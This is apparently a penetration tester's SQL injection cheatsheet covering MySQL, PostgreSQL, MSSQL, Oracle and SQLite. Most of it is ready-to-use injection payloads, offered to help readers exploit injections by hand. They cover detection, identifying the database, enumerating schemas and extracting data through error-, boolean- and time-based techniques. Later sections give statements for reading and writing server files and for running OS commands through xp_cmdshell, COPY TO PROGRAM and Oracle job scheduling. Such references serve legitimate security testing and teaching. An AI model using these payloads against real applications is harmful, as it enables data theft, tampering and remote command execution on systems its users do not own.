# SQL Injection Cheatsheet

This is an SQL injection cheatsheet with tried and true payloads / techniques that cover the 5 most popular database variants and their derivatives (**MySQL**, **PostgreSQL**, **MSSQL/SQL Server**, **Oracle**, **SQLite**).

> **Note:** This page is not intended to teach you about SQL injection itself, but rather assist you when attempting to manually exploit SQL injections. You should be familiar with the core concepts of SQL injection before using this cheatsheet. PortSwigger have a good tutorial on SQL Injection.

---

## Table of Contents

- [Key](#key)
- [Pronunciation Guide](#pronunciation-guide)
- [Avoiding OR <true> (OR 1=1)](#avoiding-or-true-or-11)
- [Safe OR-Based Payloads](#safe-or-based-payloads)
- [Break & Repair Method](#break--repair-method)
- [Identifying Variants](#identifying-variants)
- [Comments](#comments)
- [String Concatenation](#string-concatenation)
- [Substrings](#substrings)
- [Length](#length)
- [Group Concatenation](#group-concatenation)
- [Convert Characters to Integers for Comparisons](#convert-characters-to-integers-for-comparisons)
- [Limiting & Offsetting Queries](#limiting--offsetting-queries)
- [Database Version](#database-version)
- [Current Database / Schema](#current-database--schema)
- [List Databases](#list-databases)
- [List Tables](#list-tables)
- [List Columns](#list-columns)
- [Boolean Error Inferential Exploitation](#boolean-error-inferential-exploitation)
- [Error Based Exploitation](#error-based-exploitation)
- [Time Based Exploitation](#time-based-exploitation)
- [Stack Based Injection](#stack-based-injection)
- [Reading Local Files](#reading-local-files)
- [Writing Local Files](#writing-local-files)
- [Executing OS Commands](#executing-os-commands)
- [References](#references)

---

## Key

Some payloads contain placeholders which need to be replaced with specific values before they can be used. Placeholders are denoted with `<>` and are uppercase, for example `<START>`. Replace the entire placeholder (including `<>`).

---

## Pronunciation Guide

How to pronounce “SQL” correctly. 😏

- ESS CUE ELL ✔
- SEE KWUHL ✘
- SQUEAL ¯\\_(ツ)_/¯
- SQUIRREL 🐿️
- SQUIRTLE 💦🐢

---

## Avoiding OR <true> (OR 1=1)

With the exception of CTFs, injections involving an `OR <true>` expression (e.g. `' OR 1=1 -- -`) should be avoided unless absolutely necessary.

If you have a “valid value”, there is practically no need for an `OR <true>` when doing SQL injections. A valid value is one which returns a “positive” result in the application, for example a search term that returns 1 or more results, an ID that maps to an actual resource (e.g. user, product, etc.), or a valid username.

---

## Safe OR-Based Payloads

Somewhat contrary to the previous section, there are actually “safe” OR-Based payloads which can be used **without a valid value**, and should only return the first row of the query results.

| Variant | Payload | Credit |
|---|---|---|
| MySQL | `' OR IF((NOW()=SYSDATE()),SLEEP(1),1)='0` | Coffin |
| PostgreSQL | `' OR (CASE WHEN ((CLOCK_TIMESTAMP() - NOW()) < '0:0:1') THEN (SELECT '1'\|\|PG_SLEEP(1)) ELSE '0' END)='1` | Tib3rius |
| MSSQL | No Known Payload |  |
| Oracle | `' OR ROWNUM = '1` | Richard Moore |
| SQLite | `' OR ROWID = '1` | Tib3rius |

---

## Break & Repair Method

A simplistic but generally reliable method for finding basic SQL injections.

1. **Break** the statement by injecting a single or double quote into an otherwise valid value (e.g. `username=admin'`).
2. Replace the injected quote with each of the following **repairs** in turn, to see if one results in the original (uninjected) response:

### Repairs (string context)

```
' '
'||'
'+'
' AND '1'='1
' -- -
```

> Note: The last repair may cause other unexpected behavior as it ends the statement prematurely using a comment.

### Repairs (integer context)

In some cases, none of our “repairs” work because we are injecting into an integer value. In these cases, try the following repairs. Note that each one begins with a space:

```
 AND 1=1
 -- -
 AND 1=1 -- -
```

> Note: The last two repairs may cause other unexpected behavior as they end the statement prematurely using a comment.

### Example workflow

Suppose some search functionality exists where the search term `shirt` returns **23 results**. Thus the valid value is `shirt` and the associated valid response is the page containing 23 results.

Appending a single quote to the search term `shirt'` breaks the SQL statement and now 0 results are returned. Note that this may also be because the search term `shirt'` is now invalid, but the “repair” process should determine this.

Replace the single quote with one of the “repairs”, for example `shirt' '`. This new search term once again returns 23 results. Since this matches the original valid response, it is highly likely that the search functionality suffers from SQL injection.

Confirm with boolean payloads:

```
shirt' AND '1'='1
shirt' AND '1'='0
```

The first should return the original valid response (23 results), while the second should return 0 results.

---

## Identifying Variants

Once a potential injection is found, the database variant (e.g. MySQL, PostgreSQL) can be identified by injecting these payloads in order until a positive result is returned:

| Order | Payload | If Valid |
|---:|---|---|
| 1 | `AND 'foo' 'bar' = 'foobar'` | MySQL |
| 2 | `AND DATALENGTH('foo') = 3` | MSSQL |
| 3 | `AND TO_HEX(1) = '1'` | PostgreSQL |
| 4 | `AND LENGTHB('foo') = '3'` | Oracle |
| 5 | `AND GLOB('foo*', 'foobar') = 1` | SQLite |

Quick explanation: we use process-of-elimination based on functions/operators unique to each DB. For example, MySQL is the only one listed that concatenates two strings separated by a single space.

---

## Comments

This comment syntax can be used to add comments to SQL statements, useful for commenting out anything after an injection, as well as bypassing certain filters.

> Note: `--` comments require a space after the `--` to be valid, and `/*comment*/` are in-line comments.

| Variant | Syntax |
|---|---|
| MySQL | `# comment`<br>`-- comment`<br>`/*comment*/` |
| PostgreSQL | `-- comment`<br>`/*comment*/` |
| MSSQL | `-- comment`<br>`/*comment*/` |
| Oracle | `-- comment`<br>`/*comment*/` |
| SQLite | `-- comment`<br>`/*comment*/` |

---

## String Concatenation

These functions / operators can be used to concatenate two or more strings together.

| Variant | Function / Operator |
|---|---|
| MySQL | `'foo' 'bar'`<br>`CONCAT('foo', 'bar')` |
| PostgreSQL | `'foo'\|\|'bar'`<br>`CONCAT('foo', 'bar')` |
| MSSQL | `'foo'+'bar'`<br>`CONCAT('foo', 'bar')` |
| Oracle | `'foo'\|\|'bar'`<br>`CONCAT('foo', 'bar')` |
| SQLite | `'foo'\|\|'bar'`<br>`CONCAT('foo', 'bar')` |

---

## Substrings

These functions can be used to select a substring of a string. The `<START>` value should be set to **1** (not 0) to start the substring from the first character. Commaless versions are also included for bypassing certain WAFs / filtering.

| Variant | Function | Notes |
|---|---|---|
| MySQL | `SUBSTRING('foobar', <START>, <LENGTH>)`<br>`SUBSTR('foobar', <START>, <LENGTH>)`<br>`MID('foobar', <START>, <LENGTH>)`<br>`SUBSTRING('foobar' FROM <START> FOR <LENGTH>)` | `SUBSTR` and `MID` can also be used for this commaless version. |
| PostgreSQL | `SUBSTRING('foobar', <START>, <LENGTH>)`<br>`SUBSTR('foobar', <START>, <LENGTH>)`<br>`SUBSTRING('foobar' FROM <START> FOR <LENGTH>)` |  |
| MSSQL | `SUBSTRING('foobar', <START>, <LENGTH>)` |  |
| Oracle | `SUBSTR('foobar', <START>, <LENGTH>)` |  |
| SQLite | `SUBSTRING('foobar', <START>, <LENGTH>)`<br>`SUBSTR('foobar', <START>, <LENGTH>)` |  |

---

## Length

These functions count the length of strings, either in terms of bytes or characters (since some characters can have multiple bytes thanks to Unicode).

| Variant | Function | Notes |
|---|---|---|
| MySQL | `LENGTH('foo')`<br>`CHAR_LENGTH('foo')` | `LENGTH` counts bytes, `CHAR_LENGTH` counts chars. |
| PostgreSQL | `LENGTH('foo')` | Counts chars (incl. multi-byte). |
| MSSQL | `DATALENGTH('foo')`<br>`LEN('foo')` | `DATALENGTH` counts bytes, `LEN` counts chars. |
| Oracle | `LENGTHB('foo')`<br>`LENGTH('foo')` | `LENGTHB` counts bytes, `LENGTH` counts chars. |
| SQLite | `LENGTH('foo')` | Counts chars (incl. multi-byte). |

---

## Group Concatenation

These functions concatenate values from multiple rows of results into a single string. Replace `<DELIMITER>` with the string/character you want separating each value (e.g. a comma).

| Variant | Function |
|---|---|
| MySQL | `GROUP_CONCAT(expression, '<DELIMITER>')` |
| PostgreSQL | `STRING_AGG(expression, '<DELIMITER>')` |
| MSSQL | `STRING_AGG(expression, '<DELIMITER>')` |
| Oracle | `LISTAGG(expression, '<DELIMITER>')` |
| SQLite | `GROUP_CONCAT(expression, '<DELIMITER>')` |

---

## Convert Characters to Integers for Comparisons

Useful for blind SQL injections to determine the range a character falls in.

> Note: MySQL and Oracle's functions output a hexadecimal number, while the others output a decimal.

| Variant | Function | Output |
|---|---|---|
| MySQL | `HEX('a')` | 61 |
| PostgreSQL | `ASCII('a')` | 97 |
| MSSQL | `UNICODE('a')` | 97 |
| Oracle | `RAWTOHEX('a')` | 61 |
| SQLite | `UNICODE('a')` | 97 |

---

## Limiting & Offsetting Queries

Syntax for limiting the query results to a certain number of rows, as well as offsetting the starting row. Commaless versions are also included.

| Variant | Limit Query Result to 1 Row | Limit to 1 Row, Starting at Row 5 |
|---|---|---|
| MySQL | `SELECT * FROM users LIMIT 1` | `SELECT * FROM users LIMIT 4, 1`<br>`SELECT * FROM users LIMIT 1 OFFSET 4` |
| PostgreSQL | `SELECT * FROM users LIMIT 1` | `SELECT * FROM users LIMIT 1 OFFSET 4` |
| MSSQL | `SELECT * FROM users ORDER BY 1 OFFSET 0 ROWS FETCH NEXT 1 ROWS ONLY` | `SELECT * FROM users ORDER BY 1 OFFSET 4 ROWS FETCH NEXT 1 ROWS ONLY` |
| Oracle >= v12 | `SELECT * FROM users FETCH NEXT 1 ROWS ONLY` | `SELECT * FROM users OFFSET 4 ROWS FETCH NEXT 1 ROWS ONLY` |
| Oracle <= v11 | `SELECT * FROM users WHERE ROWNUM = 1` | `SELECT * FROM users WHERE ROWNUM = 5` |
| SQLite | `SELECT * FROM users LIMIT 1` | `SELECT * FROM users LIMIT 4, 1`<br>`SELECT * FROM users LIMIT 1 OFFSET 4` |

---

## Database Version

Functions and operators that provide the version information of the database.

| Variant | Function / Operator |
|---|---|
| MySQL | `@@VERSION`<br>`VERSION()`<br>`@@GLOBAL.VERSION` |
| PostgreSQL | `VERSION()` |
| MSSQL | `@@VERSION` |
| Oracle | `SELECT BANNER FROM v$version WHERE ROWNUM = 1`<br>`SELECT BANNER FROM gv$version WHERE ROWNUM = 1` |
| SQLite | `sqlite_version()` |

---

## Current Database / Schema

Queries which return the currently selected database / schema.

| Variant | Query |
|---|---|
| MySQL | `SELECT DATABASE()` |
| PostgreSQL | `SELECT CURRENT_DATABASE()`<br>`SELECT CURRENT_SCHEMA()` |
| MSSQL | `SELECT DB_NAME()`<br>`SELECT SCHEMA_NAME()` |
| Oracle | `SELECT name FROM V$database`<br>`SELECT * FROM global_name`<br>`SELECT sys_context('USERENV', 'CURRENT_SCHEMA') FROM dual;` |
| SQLite | N/A |

---

## List Databases

Queries which return a list of all databases / schemas.

| Variant | Query |
|---|---|
| MySQL | `SELECT schema_name FROM INFORMATION_SCHEMA.SCHEMATA`<br>`SELECT db FROM mysql.db` |
| PostgreSQL | `SELECT datname FROM pg_database`<br>`SELECT DISTINCT(schemaname) FROM pg_tables` |
| MSSQL | `SELECT name FROM master.sys.databases`<br>`SELECT name FROM master..sysdatabases` |
| Oracle | `SELECT OWNER FROM (SELECT DISTINCT(OWNER) FROM SYS.ALL_TABLES)` |
| SQLite | N/A |

---

## List Tables

Queries which return a list of all tables in a given database / schema.

| Variant | Query |
|---|---|
| MySQL | `SELECT table_name FROM INFORMATION_SCHEMA.TABLES WHERE table_schema='<DBNAME>'`<br>`SELECT database_name,table_name FROM mysql.innodb_table_stats WHERE database_name='<DBNAME>'` |
| PostgreSQL | `SELECT tablename FROM pg_tables WHERE schemaname = '<SCHEMA_NAME>'`<br>`SELECT table_name FROM information_schema.tables WHERE table_schema='<SCHEMA_NAME>'` |
| MSSQL | `SELECT table_name FROM information_schema.tables WHERE table_catalog='<DBNAME>'`<br>`SELECT name FROM <DBNAME>..sysobjects WHERE xtype='U'` |
| Oracle | `SELECT OWNER,TABLE_NAME FROM SYS.ALL_TABLES WHERE OWNER='<DBNAME>'` |
| SQLite | `SELECT tbl_name FROM sqlite_master WHERE type='table'` |

---

## List Columns

Queries which return a list of all columns in a given table & database / schema pair.

| Variant | Query |
|---|---|
| MySQL | `SELECT column_name,column_type FROM INFORMATION_SCHEMA.COLUMNS WHERE table_name='<TABLE_NAME>' AND table_schema='<DBNAME>'` |
| PostgreSQL | `SELECT column_name,data_type FROM information_schema.columns WHERE table_schema='<DBNAME>' AND table_name='<TABLE_NAME>'` |
| MSSQL | `SELECT COL_NAME(OBJECT_ID('<DBNAME>.<TABLE_NAME>'), <INDEX>)` |
| Oracle | `SELECT COLUMN_NAME,DATA_TYPE FROM SYS.ALL_TAB_COLUMNS WHERE TABLE_NAME='<TABLE_NAME>' AND OWNER='<DBNAME>'` |
| SQLite | `SELECT MAX(sql) FROM sqlite_master WHERE tbl_name='<TABLE_NAME>'`<br>`SELECT name FROM PRAGMA_TABLE_INFO('<TABLE_NAME>')` |

---

## Boolean Error Inferential Exploitation

Payloads which cause an error in the SQL if the `1=1` conditional is true. Replace the `1=1` with a condition you want to test; if an error propagates back to the response in some measurable way (e.g. 500 Internal Server Error), then the condition is true.

| Variant | Payload |
|---|---|
| MySQL | `AND 1=(SELECT IF(1=1,(SELECT table_name FROM information_schema.tables),1))` |
| PostgreSQL | `AND 1=(SELECT CASE WHEN (1=1) THEN CAST(1/0 AS INTEGER) ELSE 1 END)` |
| MSSQL | `AND 1=(SELECT CASE WHEN (1=1) THEN 1/0 ELSE 1 END)` |
| Oracle | `AND 1=(SELECT CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE '1' END FROM dual)` |
| SQLite | `AND 1=(SELECT CASE WHEN (1=1) THEN load_extension(1) ELSE 1 END)`<br>`AND 1=(SELECT CASE WHEN (1=1) THEN abs(-9223372036854775808) ELSE 1 END)` |

---

## Error Based Exploitation

These injection payloads should cause a database error and return the version information of the database variant within that error.

### MySQL

```
AND GTID_SUBSET(CONCAT('~',(SELECT version()),'~'),1337) -- -
AND JSON_KEYS((SELECT CONVERT((SELECT CONCAT('~',(SELECT version()),'~')) USING utf8))) -- -
AND EXTRACTVALUE(1337,CONCAT('.','~',(SELECT version()),'~')) -- -
AND UPDATEXML(1337,CONCAT('.','~',(SELECT version()),'~'),31337) -- -
OR 1 GROUP BY CONCAT('~',(SELECT version()),'~',FLOOR(RAND(0)*2)) HAVING MIN(0) -- -
AND EXP(~(SELECT * FROM (SELECT CONCAT('~',(SELECT version()),'~','x'))x)) -- -
```

### PostgreSQL

```
AND 1337=CAST('~'||(SELECT version())::text||'~' AS NUMERIC) -- -
AND (CAST('~'||(SELECT version())::text||'~' AS NUMERIC)) -- -
AND CAST((SELECT version()) AS INT)=1337 -- -
AND (SELECT version())::int=1 -- -
```

### MSSQL

```
AND 1337 IN (SELECT ('~'+(SELECT @@version)+'~')) -- -
AND 1337=CONVERT(INT,(SELECT '~'+(SELECT @@version)+'~')) -- -
AND 1337=CONCAT('~',(SELECT @@version),'~') -- -
```

### Oracle

```
AND 1337=(SELECT UPPER(XMLType(CHR(60)||CHR(58)||'~'||(REPLACE(REPLACE(REPLACE(REPLACE((SELECT banner FROM v$version),' ','_'),'$','(DOLLAR)'),'@','(AT)'),'#','(HASH)'))||'~'||CHR(62))) FROM DUAL) -- -
AND 1337=UTL_INADDR.GET_HOST_ADDRESS('~'||(SELECT banner FROM v$version)||'~') -- -
AND 1337=CTXSYS.DRITHSX.SN(1337,'~'||(SELECT banner FROM v$version)||'~') -- -
AND 1337=DBMS_UTILITY.SQLID_TO_SQLHASH('~'||(SELECT banner FROM v$version)||'~') -- -
```

---

## Time Based Exploitation

### Simple Time Based Injections

> Note: These payloads are inherently dangerous as the sleep function may execute multiple times. They will cause the database to sleep for 10 seconds per row evaluated by the query.

Use only if you are certain only one row is evaluated.

| Variant | Payload |
|---|---|
| MySQL | `AND SLEEP(10)=0` |
| PostgreSQL | `AND 'RANDSTR'||PG_SLEEP(10)='RANDSTR'` |
| MSSQL | `AND 1337=(CASE WHEN (1=1) THEN (SELECT COUNT(*) FROM sysusers AS sys1,sysusers AS sys2,sysusers AS sys3,sysusers AS sys4,sysusers AS sys5,sysusers AS sys6,sysusers AS sys7) ELSE 1337 END)` |
| Oracle | `AND 1337=(CASE WHEN (1=1) THEN DBMS_PIPE.RECEIVE_MESSAGE('RANDSTR',10) ELSE 1337 END)` |
| SQLite | `AND 1337=LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(1000000000/2))))` |

### Complex Time Based Injections (Safe)

These payloads are “safe” and should only ever sleep once per statement. Replace `1=1` with a condition you want to test; if a 10 second delay occurs, then the condition is true.

| Variant | Payload |
|---|---|
| MySQL | `AND (SELECT 1337 FROM (SELECT(SLEEP(10-(IF((1=1),0,10))))) RANDSTR)` |
| PostgreSQL | `AND 1337=(CASE WHEN (1=1) THEN (SELECT 1337 FROM PG_SLEEP(10)) ELSE 1337 END)` |
| MSSQL | `AND 1337=(CASE WHEN (1=1) THEN (SELECT COUNT(*) FROM sysusers AS sys1,sysusers AS sys2,sysusers AS sys3,sysusers AS sys4,sysusers AS sys5,sysusers AS sys6,sysusers AS sys7) ELSE 1337 END)` |
| Oracle | `AND 1337=(CASE WHEN (1=1) THEN DBMS_PIPE.RECEIVE_MESSAGE('RANDSTR',10) ELSE 1337 END)` |
| SQLite | `AND 1337=(CASE WHEN (1=1) THEN (SELECT 1337 FROM (SELECT LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(1000000000/2)))))) ELSE 1337 END)` |

---

## Stack Based Injection

Generally if stacked queries are supported, it is often only detectable by causing a time based delay.

Delay 10 seconds:

| Variant | Payload |
|---|---|
| MySQL | `; SLEEP(10) -- -` |
| PostgreSQL | `; PG_SLEEP(10) -- -` |
| MSSQL | `; WAITFOR DELAY '0:0:10' -- -` |
| Oracle | `; DBMS_PIPE.RECEIVE_MESSAGE('RANDSTR',10) -- -` |
| SQLite | `; RANDOMBLOB(1000000000/2) -- -` |

Conditional delay 10 seconds if `1=1` is true (replace condition):

| Variant | Payload |
|---|---|
| MySQL | `; SELECT IF((1=1),SLEEP(10),1337)` |
| PostgreSQL | `; SELECT (CASE WHEN (1=1) THEN (SELECT 1337 FROM PG_SLEEP(10)) ELSE 1337 END)` |
| MSSQL | `; IF(1=1) WAITFOR DELAY '0:0:10'` |
| Oracle | `; SELECT CASE WHEN (1=1) THEN DBMS_PIPE.RECEIVE_MESSAGE('RANDSTR',10) ELSE 1337 END FROM DUAL` |
| SQLite | `; SELECT (CASE WHEN (1=1) THEN (LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(1000000000/2))))) ELSE 1337 END)` |

---

## Reading Local Files

These functions read the contents of local files. The Oracle method can only occur if stacked injections are possible. SQLite's `readfile` is not a core function.

| Variant | Function |
|---|---|
| MySQL | `LOAD_FILE('/path/to/file')` |
| PostgreSQL | `PG_READ_FILE('/path/to/file')` |
| MSSQL | `OPENROWSET(BULK 'C:\path\to\file', SINGLE_CLOB)` |
| Oracle | `utl_file.get_line(utl_file.fopen('/path/to/','file','R'), <buffer>)` |
| SQLite | `readfile('/path/to/file')` |

---

## Writing Local Files

These statements write content to a local file. The PostgreSQL, MSSQL, and Oracle methods can only occur if stacked injections are possible. MSSQL requires Ole Automation Procedures.

| Variant | Statement |
|---|---|
| MySQL | `SELECT 'contents' INTO OUTFILE '/path/to/file'` |
| PostgreSQL | `COPY (SELECT 'contents') TO '/path/to/file'` |
| MSSQL | `execute spWriteStringToFile 'contents', 'C:\path\to\', 'file'` |
| Oracle | `utl_file.put_line(utl_file.fopen('/path/to/','file','R'), <buffer>)` |
| SQLite | `SELECT writefile('/path/to/file', column_name) FROM table_name` |

---

## Executing OS Commands

These statements execute local OS commands. PostgreSQL, MSSQL, and the 2nd Oracle method require stacked injections. The 1st Oracle method requires the OS_Command package.

| Variant | Statement |
|---|---|
| MySQL | Not Possible |
| PostgreSQL | `COPY (SELECT '') to program '<COMMAND>'` |
| MSSQL | `EXEC xp_cmdshell '<COMMAND>'` |
| Oracle | `SELECT os_command.exec_clob('<COMMAND>') cmd from dual`<br>`DBMS_SCHEDULER.CREATE_JOB (job_name => 'exec', job_type => 'EXECUTABLE', job_action => '<COMMAND>', enabled => TRUE)` |
| SQLite | Not Possible |

---

## References

The vast majority of the information comprised here came from personal research / experimentation with various injections and database variants. However several payloads were either taken from, or based on those found in the popular SQL injection tool SQLmap.
